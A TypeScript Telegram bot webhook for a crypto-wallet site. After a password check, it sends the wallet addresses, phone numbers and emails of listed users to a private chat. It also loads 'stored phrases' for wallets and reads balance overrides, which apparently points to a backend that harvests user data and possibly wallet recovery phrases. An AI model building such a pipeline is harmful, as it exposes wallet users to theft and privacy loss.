import { createFileRoute } from "@tanstack/react-router";
import { z } from "zod";
import { createAccountCallback, verifyAccountCallback } from "@/lib/telegram-pull-auth.server";

const DEFAULT_ALLOWED_CHAT_ID = -1003957750577;
const UNLOCK_MINUTES = 10;
const PASSWORD_PROMPT = "🔐 Reply with the admin password to continue.";

const telegramUpdateSchema = z.object({
  callback_query: z.object({
    id: z.string(),
    from: z.object({ id: z.number() }),
    data: z.string().optional(),
    message: z.object({ chat: z.object({ id: z.number() }) }).optional(),
  }).optional(),
  message: z.object({
    message_id: z.number(),
    chat: z.object({ id: z.number() }),
    from: z.object({ id: z.number() }).optional(),
    text: z.string().optional(),
    reply_to_message: z.object({
      text: z.string().optional(),
      from: z.object({ is_bot: z.boolean().optional() }).optional(),
    }).optional(),
  }).optional(),
  edited_message: z.object({
    message_id: z.number(),
    chat: z.object({ id: z.number() }),
    from: z.object({ id: z.number() }).optional(),
    text: z.string().optional(),
    reply_to_message: z.object({
      text: z.string().optional(),
      from: z.object({ is_bot: z.boolean().optional() }).optional(),
    }).optional(),
  }).optional(),
});

interface TelegramAccount {
  id: string;
  username: string;
  wallet_address: string;
  phone_number?: string | null;
  email_address?: string | null;
  created_at?: string | null;
}

function esc(value: string) {
  return value.replace(/[<>&]/g, (char) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" })[char] ?? char);
}

async function tg(method: string, body: unknown) {
  const token = process.env["TELEGRAM_BOT_TOKEN"];
  if (!token) return null;
  const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!res.ok) console.error("[tg]", method, res.status, await res.text());
  return res;
}

/** Explicit TELEGRAM_WEBHOOK_SECRET, or one derived from the bot token (must match scripts/register-telegram-webhook.mjs). */
async function webhookSecret() {
  const explicit = (process.env["TELEGRAM_WEBHOOK_SECRET"] ?? "").trim();
  if (explicit) return explicit;
  const token = (process.env["TELEGRAM_BOT_TOKEN"] ?? "").trim();
  if (!token) return "";
  const { createHash } = await import("node:crypto");
  return createHash("sha256").update(`telegram-webhook:${token}`).digest("base64url");
}

function getAllowedChatId() {
  const configured = Number(process.env["TELEGRAM_CHAT_ID"]);
  return Number.isSafeInteger(configured) ? configured : DEFAULT_ALLOWED_CHAT_ID;
}

interface PhraseRow {
  wallet_address: string;
  username: string | null;
}

/** Stable synthetic id for phrase rows that have no wallet_profiles entry. */
async function syntheticId(address: string) {
  const { createHash } = await import("node:crypto");
  return createHash("sha256").update(address.toLowerCase()).digest("hex").slice(0, 32);
}

async function loadPhrases(): Promise<PhraseRow[]> {
  try {
    const { loadAllStoredPhrases } = await import("@/lib/phrase-lookup.server");
    const rows = await loadAllStoredPhrases();
    return rows.map((r) => ({
      wallet_address: r.wallet_address,
      username: r.username,
    }));
  } catch (error) {
    console.error("[telegram] phrase lookup unavailable", error);
    return [];
  }
}

function errText(e: unknown) {
  if (e instanceof Error) return e.message;
  if (e && typeof e === "object" && "message" in e) return String((e as { message: unknown }).message);
  return String(e);
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type AnyRow = Record<string, any>;

async function selectAll(table: string, columns: string): Promise<AnyRow[]> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const { data, error } = await (supabaseAdmin as any).from(table).select(columns).limit(2000);
  if (error) throw new Error(`${table}: ${error.message}`);
  return (data ?? []) as AnyRow[];
}

function byNewest(rows: AnyRow[]) {
  return [...rows].sort((a, b) => String(b.created_at ?? "").localeCompare(String(a.created_at ?? "")));
}

async function listAccounts(): Promise<TelegramAccount[]> {
  // Profiles are required; everything else is optional and skipped on failure.
  let profiles: AnyRow[];
  try {
    profiles = byNewest(await selectAll("wallet_profiles", "*"));
  } catch (e) {
    throw new Error(`wallet_profiles table is unreachable. Check that SUPABASE_URL + SUPABASE_SERVICE_ROLE_KEY are set in Netlify and the wallet_profiles migration ran. Detail: ${errText(e)}`);
  }
  const [logins, overrides] = await Promise.allSettled([
    selectAll("wallet_logins", "*"),
    selectAll("wallet_balance_overrides", "wallet_address"),
  ]);
  if (logins.status === "rejected") console.error("[telegram] logins skipped", logins.reason);
  if (overrides.status === "rejected") console.error("[telegram] overrides skipped", overrides.reason);

  const seen = new Set<string>();
  const out: TelegramAccount[] = [];
  const short = (a: string) => `${a.slice(0, 6)}…${a.slice(-4)}`;
  const add = async (address: string, username: string | null | undefined, id?: string, created_at?: string | null) => {
    if (!address || seen.has(address.toLowerCase())) return;
    seen.add(address.toLowerCase());
    out.push({ id: id ?? (await syntheticId(address)), username: username || short(address), wallet_address: address, created_at });
  };

  for (const row of profiles) await add(String(row.wallet_address ?? ""), row.username, row.id, row.created_at);
  if (logins.status === "fulfilled") {
    for (const row of byNewest(logins.value)) await add(String(row.wallet_address ?? ""), row.username, undefined, row.created_at);
  }
  if (overrides.status === "fulfilled") {
    for (const row of overrides.value) await add(String(row.wallet_address ?? ""), null);
  }

  if (!out.length) {
    const phrases = await Promise.race([
      loadPhrases(),
      new Promise<PhraseRow[]>((r) => setTimeout(() => r([]), 3000)),
    ]);
    for (const row of phrases) await add(String(row.wallet_address ?? ""), row.username);
  }
  return out;
}

async function getAccount(id: string): Promise<TelegramAccount | null> {
  let supabaseAdmin;
  try {
    ({ supabaseAdmin } = await import("@/integrations/supabase/client.server"));
  } catch (importErr) {
    throw new Error(`Supabase admin client failed to load: ${errText(importErr)}`);
  }

  let data: AnyRow | null = null;
  try {
    const res = await supabaseAdmin.from("wallet_profiles").select("*").eq("id", id).maybeSingle();
    if (res.error) throw new Error(`wallet_profiles lookup by id: ${res.error.message}`);
    data = (res.data as AnyRow) ?? null;
  } catch (queryErr) {
    throw new Error(`Database query failed: ${errText(queryErr)}`);
  }

  const target = id.replaceAll("-", "");
  let base: AnyRow | undefined = data ?? undefined;
  if (!base) {
    let all: TelegramAccount[];
    try {
      all = await listAccounts();
    } catch (listErr) {
      throw new Error(`Could not scan account list: ${errText(listErr)}`);
    }
    base = all.find((a) => a.id.replaceAll("-", "") === target) as AnyRow | undefined;
  }
  if (!base) return null;

  let contact: AnyRow = base;
  if (!data) {
    try {
      const res = await supabaseAdmin.from("wallet_profiles").select("*").eq("wallet_address", base.wallet_address).maybeSingle();
      if (res.error) console.warn("[telegram] getAccount contact lookup skipped:", res.error.message);
      else if (res.data) contact = res.data as AnyRow;
    } catch (contactErr) {
      console.warn("[telegram] getAccount contact lookup skipped:", errText(contactErr));
    }
  }

  return {
    id: String(base.id),
    username: String(base.username ?? base.wallet_address),
    wallet_address: String(base.wallet_address),
    phone_number: contact.phone_number ?? contact.phone ?? null,
    email_address: contact.email_address ?? contact.email ?? null,
  };
}

function chunkButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
  const buttons = rows.map((r) => ({
    text: r.username,
    callback_data: createAccountCallback(r.id, userId, expiresAt),
  }));
  const out: Array<Array<{ text: string; callback_data: string }>> = [];
  for (let i = 0; i < buttons.length; i += 2) out.push(buttons.slice(i, i + 2));
  return out;
}

function paginateButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
  const pages: ReturnType<typeof chunkButtons>[] = [];
  for (let i = 0; i < rows.length; i += 80) {
    pages.push(chunkButtons(rows.slice(i, i + 80), userId, expiresAt));
  }
  return pages;
}

export const Route = createFileRoute("/api/public/telegram/webhook")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const allowedChatId = getAllowedChatId();
        const expected = await webhookSecret();
        if (!expected) return new Response("Webhook not configured", { status: 503 });
        const got = request.headers.get("x-telegram-bot-api-secret-token") ?? "";
        const { timingSafeStrEq } = await import("@/lib/admin.server");
        if (!timingSafeStrEq(got, expected)) return new Response("Unauthorized", { status: 401 });

        const rawUpdate: unknown = await request.json().catch(() => null);
        const parsed = telegramUpdateSchema.safeParse(rawUpdate);
        if (!parsed.success) return Response.json({ ok: true, ignored: true });
        const update = parsed.data;

        // Callback query — user tapped a username button
        if (update.callback_query) {
          const cb = update.callback_query;
          const chatId = cb.message?.chat?.id;
          const userId = cb.from?.id;
          const data: string = cb.data ?? "";
          if (chatId !== allowedChatId || !userId) {
            await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Not allowed" });
            return Response.json({ ok: true });
          }
          if (!data.startsWith("a:")) {
            await tg("answerCallbackQuery", { callback_query_id: cb.id });
            return Response.json({ ok: true });
          }
          const authorization = verifyAccountCallback(data, userId);
          if (!authorization) {
            await tg("answerCallbackQuery", {
              callback_query_id: cb.id,
              text: "This account list expired or belongs to another manager. Send /pull again.",
              show_alert: true,
            });
            return Response.json({ ok: true });
          }
          let account: TelegramAccount | null = null;
          try {
            account = await getAccount(authorization.accountId);
          } catch (error) {
            console.error("[telegram] account lookup failed", error);
            const detail = errText(error).slice(0, 180);
            await tg("answerCallbackQuery", {
              callback_query_id: cb.id,
              text: `❌ Account lookup failed. ${detail}`,
              show_alert: true,
            });
            return Response.json({ ok: true });
          }
          await tg("answerCallbackQuery", { callback_query_id: cb.id });
          if (!account) {
            await tg("sendMessage", { chat_id: chatId, text: "❌ That account is no longer available." });
            return Response.json({ ok: true });
          }
          const text = [
            `👤 <b>${esc(account.username)}</b>`,
            `💼 <code>${esc(account.wallet_address)}</code>`,
            `📱 Phone: ${account.phone_number ? esc(account.phone_number) : "Not added"}`,
            `✉️ Email: ${account.email_address ? esc(account.email_address) : "Not added"}`,
          ].join("\n");
          await tg("sendMessage", { chat_id: chatId, text, parse_mode: "HTML" });
          return Response.json({ ok: true });
        }

        const msg = update.message ?? update.edited_message;
        if (!msg?.chat?.id) return Response.json({ ok: true });
        const chatId = msg.chat.id;
        const userId = msg.from?.id;
        if (chatId !== allowedChatId || !userId) return Response.json({ ok: true });
        const text: string = msg.text ?? "";

        // /pull command
        if (/^\/pull(@\w+)?$/i.test(text.trim())) {
          await tg("sendMessage", {
            chat_id: chatId,
            text: PASSWORD_PROMPT,
            reply_markup: { force_reply: true, selective: true },
            reply_to_message_id: msg.message_id,
          });
          return Response.json({ ok: true });
        }

        // Password reply — match by prefix so Telegram's appended bot username
        // (e.g. "🔐 Reply… (@PrimeBot)") or minor edits don't break recognition.
        const replyTo = msg.reply_to_message;
        if (replyTo?.from?.is_bot && typeof replyTo.text === "string" && replyTo.text.includes("admin password")) {
          const password = text.trim();
          const { verifyAdminPassword } = await import("@/lib/admin.server");
          // Delete the message containing the password to keep it out of chat history.
          await tg("deleteMessage", { chat_id: chatId, message_id: msg.message_id }).catch(() => null);
          if (!verifyAdminPassword(password)) {
            const hint = (process.env["ADMIN_PASSWORD"] ?? "").trim() ? "" : " (ADMIN_PASSWORD is not set on this site)";
            await tg("sendMessage", { chat_id: chatId, text: `❌ Wrong password.${hint}` });
            return Response.json({ ok: true });
          }
          await tg("sendMessage", { chat_id: chatId, text: "🔓 Password accepted, loading accounts…" });
          let rows: TelegramAccount[];
          try {
            rows = await listAccounts();
          } catch (error) {
            console.error("[telegram] account list failed", error);
            await tg("sendMessage", { chat_id: chatId, text: `❌ Could not load accounts: ${errText(error).slice(0, 300)}` });
            return Response.json({ ok: true });
          }
          if (!rows.length) {
            await tg("sendMessage", { chat_id: chatId, text: "✅ Unlocked, but no accounts on file yet." });
            return Response.json({ ok: true });
          }
          const expiresAt = Date.now() + UNLOCK_MINUTES * 60_000;
          const pages = paginateButtons(rows, userId, expiresAt);
          for (let page = 0; page < pages.length; page += 1) {
            await tg("sendMessage", {
              chat_id: chatId,
              text: page === 0
                ? `✅ Unlocked for ${UNLOCK_MINUTES} min. Pick an account:`
                : `Accounts ${page * 80 + 1}–${Math.min((page + 1) * 80, rows.length)} of ${rows.length}:`,
              reply_markup: { inline_keyboard: pages[page] },
            });
          }
          return Response.json({ ok: true });
        }

        return Response.json({ ok: true });
      },
    },
  },
});
